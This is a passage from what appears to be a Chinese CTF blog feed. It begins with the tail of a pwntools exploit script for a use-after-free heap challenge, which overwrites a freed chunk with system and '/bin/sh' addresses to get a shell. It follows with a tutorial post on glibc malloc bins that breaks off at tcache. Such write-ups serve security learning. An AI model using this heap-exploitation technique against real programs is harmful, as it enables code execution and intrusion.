class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Please input size: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Please input content: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tse<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Please input list index: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Print</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Please input list index: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>system <span class=\"token operator\">=</span> <span class=\"token number\">0x4007A0</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>binsh <span class=\"token operator\">=</span> <span class=\"token number\">0x0602010</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>Print<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "堆",
                "uaf"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/08/09/bins/",
            "url": "https://yhuanhuan01.github.io/2023/08/09/bins/",
            "title": "bins",
            "date_published": "2023-08-09T02:57:17.000Z",
            "content_html": "<h1 id=\"pwn堆-bins学习\"><a class=\"markdownIt-Anchor\" href=\"#pwn堆-bins学习\">#</a> pwn 堆 bins 学习。</h1>\n<h2 id=\"一-bin链的介绍\"><a class=\"markdownIt-Anchor\" href=\"#一-bin链的介绍\">#</a> 一、bin 链的介绍</h2>\n<p>bin 是一个由 struct chunk 结构体组成的链表。<br>\n前面介绍过，不同的 chunk 根据特点不同分为不同的 chunk，为了将这些 chunk 进行分类的管理，glibc 采用了 bin 链这种方式管理不同的 chunk。<br>\n不同的 bin 链是由 arena 管理的。<br>\nbin 链中的 chunk 均为 free chunk。</p>\n<h2 id=\"二-bin链分类\"><a class=\"markdownIt-Anchor\" href=\"#二-bin链分类\">#</a> 二、bin 链分类</h2>\n<ul>\n<li>根据 bin 链成员的大小不同，分为以下几类：\n<ul>\n<li>fast bin 是单链表，其他都是双向链表。</li>\n<li><strong>Fast bin。</strong></li>\n<li><strong>Unsorted bin。</strong></li>\n<li><strong>Small bin。</strong></li>\n<li><strong>Large bin。</strong></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"三-bin链的保存struct-malloc_state结构体\"><a class=\"markdownIt-Anchor\" href=\"#三-bin链的保存struct-malloc_state结构体\">#</a> 三、bin 链的保存（struct malloc_state 结构体）</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span><span class=\"token operator\">*</span> mchunkptr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span> <span class=\"token operator\">*</span>mfastbinptr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_state</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token comment\">/*other member*/</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token comment\">/* Fastbins */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  mfastbinptr fastbinsY<span class=\"token punctuation\">[</span>NFASTBINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">/* Normal bins packed as described above */</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  mchunkptr bins<span class=\"token punctuation\">[</span>NBINS <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">/*other member*/</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>前面说过，不同的 bin 链是由 arena 管理的。因此一个线程中会有很多的 bin 链，这些 bin 链都有 arena 所表示的 struct malloc_state 结构体的以下成员保存：<br>\nfastbinY 数组：大小为 10。记录的是 fast bin 链。<br>\nbins 数组：大小为 129。记录的是 unsorted bin（1）、small bin（2~63）、large bin 链（64~126）。<br>\n<img data-src=\"/img/bins/4.jpg\" alt=\"img\"></p>\n</blockquote>\n<h2 id=\"四-fast-bin\"><a class=\"markdownIt-Anchor\" href=\"#四-fast-bin\">#</a> 四、Fast Bin</h2>\n<p>概念：chunk 的大小在 32 字节 ——128 字节（0x20——0x80）的 chunk 称为 “fast chunk”（大小不是 malloc 时的大小，而是在内存中 struct malloc_chunk 的大小，包含前 2 个成员）。<br>\nfast bin 链表的个数为 10 个。<br>\n不会对 free chunk 进行合并：鉴于设计 fast bin 的初衷就是进行快速的小内存分配和释放，因此系统将属于 fast bin 的 chunk 的 PREV_INUSE 位总是设置为 1，这样即使当 fast bin 中有某个 chunk 同一个 free chunk 相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜。</p>\n<blockquote>\n<p>fastbinsY 数组存储 fastbins 的规则</p>\n<ul>\n<li>\n<p>每个 fast bin 链表都是单链表（使用 fd 指针）。因此，fast bin 中无论是添加还是移除 fast chunk，都是对 “链表尾” 进行操作，而不会对某个中间的 fast chunk 进行操作。</p>\n</li>\n<li>\n<p>单个 fastbin 链表中的 chunk 大小都是相同的，各个 fastbin 链表中的 chunk 大小是不同的。</p>\n</li>\n<li>\n<p>fastbinY 数组中的每个 bin 链表的排序，是按照链表元素的大小进行排序的。数组的第一个元素的 fast bin 链表中的每个 chunk 的大小是 32 字节的，数组的第二个元素的 fast bin 链表中的每个 chunk 的大小是 48 字节的… 每个元素都比前面的 fast bin 链大 16 字节，以此类推进行排序。</p>\n<p><img data-src=\"/img/bins/1.jpg\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>链表索引宏定义：（fastbin_index）</p>\n<ul>\n<li>\n<p>** 功能：** 通过此宏能判断某一个 fastchunk 属于哪一个 fastbin 链表。</p>\n</li>\n<li>\n<p>** 参数：** 某一个 chunk 的大小。</p>\n<p><img data-src=\"/img/bins/20190730083911707.png\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>malloc 操作与 fastbins 的初始化：<br>\n当应用层通过 malloc 函数第一次申请的 chunk 属于 16 字节～80 字节之间时，因为初始化的时候 fast bin 支持的最大内存大小以及所有 fast bin 链表都是空的，所以它也不会交由 fast bin 来处理，而是向下传递交由 small bin 来处理，如果 small bin 也为空的话就交给 unsorted bin 处理。</li>\n<li>那么，fast bin 如何进行初始化哪？<br>\n当我们第一次调用 malloc (fast bin) 的时候，系统执行_int_malloc 函数，该函数首先会发现当前 fast bin 为空，就转交给 small bin 处理，进而又发现 small bin 也为空，就调用 malloc_consolidate 函数对 malloc_state 结构体进行初始化。malloc_consolidate 函数主要完成以下几个功能：<br>\na  首先判断当前 malloc_state 结构体中的 fast bin 是否为空，如果为空就说明整个 malloc_state 都没有完成初始化，需要对 malloc_state 进行初始化。<br>\nb  malloc_state 的初始化操作由函数 malloc_init_state (av) 完成，该函数先初始化除 fast bin 之外的所有的 bins，再初始化 fast bins。<br>\n那么当再次执行 malloc (fast chunk) 函数的时候，此时 fast bin 相关数据不为空了，就可以使用 fast bin。</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>free 操作<br>\n这个操作很简单，主要分为两步：先通过 chunksize 函数根据传入的地址指针获取该指针对应的 chunk 的大小；然后根据这个 chunk 大小获取该 chunk 所属的 fast bin，然后再将此 chunk 添加到该 fast bin 的链尾即可。整个操作都是在_int_free 函数中完成。</li>\n</ul>\n</blockquote>\n<h2 id=\"五-unsorted-bin\"><a class=\"markdownIt-Anchor\" href=\"#五-unsorted-bin\">#</a> 五、Unsorted Bin</h2>\n<p>何时使用：当释放较小或较大的 chunk 的时候，如果系统没有将它们添加到对应的 bins 中，系统就将这些 chunk 添加到 unsorted bin 中。<br>\n目的：这主要是为了让 “glibc malloc 机制” 能够有第二次机会重新利用最近释放的 chunk (第一次机会就是 fast bin 机制)。利用 unsorted bin，可以加快内存的分配和释放操作，因为整个操作都不再需要花费额外的时间去查找合适的 bin 了。<br>\nUnsorted bin 的特性如下：<br>\nunsorted bin 的个数： 1 个。<br>\nunsorted bin 是一个由 free chunks 组成的循环双链表。<br>\n在 unsorted bin 中，对 chunk 的大小并没有限制，任何大小的 chunk 都可以归属到 unsorted bin 中。<br>\nunsortedbin 采用的遍历顺序是 FIFO。</p>\n<h2 id=\"六-small-bin\"><a class=\"markdownIt-Anchor\" href=\"#六-small-bin\">#</a> 六、Small Bin</h2>\n<p>概念：小于 1024 字节（0x400）的 chunk 称之为 small chunk，small bin 就是用于管理 small chunk 的。<br>\nsmall bin 链表的个数为 62 个。<br>\n就内存的分配和释放速度而言，small bin 比 larger bin 快，但比 fast bin 慢。<br>\n合并操作：相邻的 free chunk 需要进行合并操作，即合并成一个大的 free chunk。具体操作见下文 free (small chunk) 介绍。</p>\n<blockquote>\n<ul>\n<li>\n<p>Small Bin 链表的特性</p>\n</li>\n<li>\n<p>每个 smallbin 也是一个由对应 free chunk 组成的循环双链表。</p>\n</li>\n<li>\n<p>small bin 采用 FIFO (先入先出) 算法：内存释放操作就将新释放的 chunk 添加到链表的 front end (前端)，分配操作就从链表的 rear end (尾端) 中获取 chunk。</p>\n</li>\n<li>\n<p>单个 smallbin 链表中的 chunk 大小都是相同的，各个 smallbin 链表中的 chunk 大小是不同的，跟 fastbinsY 数组存储 fastbin 链的原理是相同的。<br>\nbins 数组存储 small bin 链时：第一个 small bin 链中 chunk 的大小为 32 字节，后续每个 small bin 中 chunk 的大小依次增加两个机器字长（32 位相差 8 字节，64 位相差 16 字节）… 以此类推，跟 fastbinsY 数组存储 fastbin 链的原理是相同的（用下图表示）。</p>\n</li>\n<li>\n<p>bin 链存储的大小与数组下标的关系：chun_size=2<em>SIZE_SZ</em>index。</p>\n<p><img data-src=\"/img/bins/2.jpg\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>malloc 操作与 small bin 的初始化</p>\n<ul>\n<li>类似于 fast bins，最初所有的 small bin 都是空的，因此在对这些 small bin 完成初始化之前，即使用户请求的内存大小属于 small chunk 也不会交由 small bin 进行处理，而是交由 unsorted bin 处理。</li>\n<li>如果 unsorted bin 也不能处理的话，glibc malloc 就依次遍历后续的所有 bins，找出第一个满足要求的 bin，如果所有的 bin 都不满足的话，就转而使用 top chunk，如果 top chunk 大小不够，那么就扩充 top chunk，这样就一定能满足需求了。</li>\n<li>注意遍历后续 bins 以及之后的操作同样被 large bin 所使用，因此，将这部分内容放到 large bin 的 malloc 操作中加以介绍。</li>\n<li>那么 glibc malloc 是如何初始化这些 bins 的呢？因为这些 bin 属于 malloc_state 结构体，所以在初始化 malloc_state 的时候就会对这些 bin 进行初始化，代码如下：\n<ul>\n<li>将 bins 数组中的第一个成员索引值设置为了 1，而不是我们常用的 0 (在 bin_at 宏中，自动将 i 进行了减 1 处理)。</li>\n<li>从上面代码可以看出在初始化的时候 glibc malloc 将所有 bin 的指针都指向了自己 —— 这就代表这些 bin 都是空的。</li>\n</ul>\n</li>\n</ul>\n<p>​</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">malloc_init_state</span> <span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    mbinptr bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">/* Establish circular links for normal bins */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> NBINS<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    bin <span class=\"token operator\">=</span> <span class=\"token function\">bin_at</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    bin<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> bin<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ul>\n<li>过后，当再次调用 malloc (small chunk) 的时候，如果该 chunk size 对应的 small bin 不为空，就从该 small bin 链表中取得 small chunk 给 malloc 使用。</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>free 操作</p>\n<ul>\n<li>small 的 free 比较特殊。当释放 small chunk 的时候，先检查该 chunk 相邻的 chunk 是否为 free，如果是的话就进行合并操作：将这些 chunks 合并成新的 chunk，然后将它们从 small bin 中移除，最后将新的 chunk 添加到 unsorted bin 中，之后 unsorted bin 进行整理再添加到对应的 bin 链上（后面会有图介绍）。</li>\n</ul>\n</blockquote>\n<h2 id=\"七-large-bin\"><a class=\"markdownIt-Anchor\" href=\"#七-large-bin\">#</a> 七、Large Bin</h2>\n<ul>\n<li>\n<p>概念：大于等于 1024 字节（0x400）的 chunk 称之为 large chunk，large bin 就是用于管理这些 largechunk 的。</p>\n</li>\n<li>\n<p>large bin 链表的个数为 63 个，被分为 6 组。</p>\n</li>\n<li>\n<p>largechunk 使用 fd_nextsize、bk_nextsize 连接起来的。</p>\n</li>\n<li>\n<p>合并操作：类似于 small bin。</p>\n</li>\n</ul>\n<blockquote>\n<p>Large Bin 链表的特性</p>\n<ul>\n<li>同一个 largebin 中每个 chunk 的大小可以不一样，这些 chunk 根据一定的范围存储在一个 larbin 链表中。</li>\n<li>large chunk 可以添加、删除在 large bin 的任何一个位置。</li>\n<li>在这 63 个 largebins 中：第一组的 32 个 largebin 链依次以 64 字节步长为间隔，即第一个 largebin 链中 chunksize 为 1024-1087 字节，第二个 large bin 中 chunk size 为 1088~1151 字节。第二组的 16 个 largebin 链依次以 512 字节步长为间隔；第三组的 8 个 largebin 链以步长 4096 为间隔；第四组的 4 个 largebin 链以 32768 字节为间隔；第五组的 2 个 largebin 链以 262144 字节为间隔；最后一组的 largebin 链中的 chunk 大小无限制。</li>\n</ul>\n<p><img data-src=\"/img/bins/3.jpg\" alt=\"img\"></p>\n<ul>\n<li>在同一个 largebin 中：每个 chunk 的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个 largebin 中的所有 chunk 按照 chunksize 进行从大到小的排列：最大的 chunk 放在一个链表的 front end，最小的 chunk 放在 rear end；相同大小的 chunk 按照最近使用顺序排序。</li>\n</ul>\n</blockquote>\n<blockquote>\n<h3 id=\"链表索引宏定义largebin_index\"><a class=\"markdownIt-Anchor\" href=\"#链表索引宏定义largebin_index\">#</a> 链表索引宏定义：（largebin_index）</h3>\n<ul>\n<li>\n<p>参数为链表能存储的 chunk 大小，宏定义中有简介调用其他宏定义。</p>\n</li>\n<li>\n<p>例如：第一个 largebin 的起始大小为 1024，那么 1024&gt;&gt;6=16，所以其在 bins 数组中的下标为 48+16=64。</p>\n<p><img data-src=\"/img/bins/5.jpg\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>malloc 操作与 large bin 的初始化</p>\n<ul>\n<li>初始化完成之前的操作类似于 small bin。</li>\n<li>下面讨论 large bins 初始化完成之后的操作：\n<ul>\n<li>首先确定用户请求的大小属于哪一个 large bin，然后判断该 large bin 中最大的 chunk 的 size 是否大于用户请求的 size (只需要对比链表中 front end 的 size 即可)。如果大于，就从 rear end 开始遍历该 large bin，找到第一个 size 相等或接近的 chunk，分配给用户。如果该 chunk 大于用户请求的 size 的话，就将该 chunk 拆分为两个 chunk：前者返回给用户，且 size 等同于用户请求的 size；剩余的部分做为一个新的 chunk 添加到 unsorted bin 中。</li>\n<li>如果该 large bin 中最大的 chunk 的 size 小于用户请求的 size 的话，那么就依次查看后续的 large bin 中是否有满足需求的 chunk，不过需要注意的是鉴于 bin 的个数较多 (不同 bin 中的 chunk 极有可能在不同的内存页中)，如果按照上一段中介绍的方法进行遍历的话 (即遍历每个 bin 中的 chunk)，就可能会发生多次内存页中断操作，进而严重影响检索速度，所以 glibc malloc 设计了 Binmap 结构体来帮助提高 bin-by-bin 检索的速度。Binmap 记录了各个 bin 中是否为空，通过 bitmap 可以避免检索一些空的 bin。如果通过 binmap 找到了下一个非空的 large bin 的话，就按照上一段中的方法分配 chunk，否则就使用 top chunk 来分配合适的内存。</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<h3 id=\"free操作\"><a class=\"markdownIt-Anchor\" href=\"#free操作\">#</a> free 操作</h3>\n<ul>\n<li>\n<p>类似于 small chunk。</p>\n<p><img data-src=\"/img/bins/6.jpg\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<h2 id=\"八-tcache\"><a class=\"markdownIt-Anchor\" href=\"#八-tcache\">#</a> 八、tcache</h2>\n<p>cache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术（see <span class=\"exturl\" 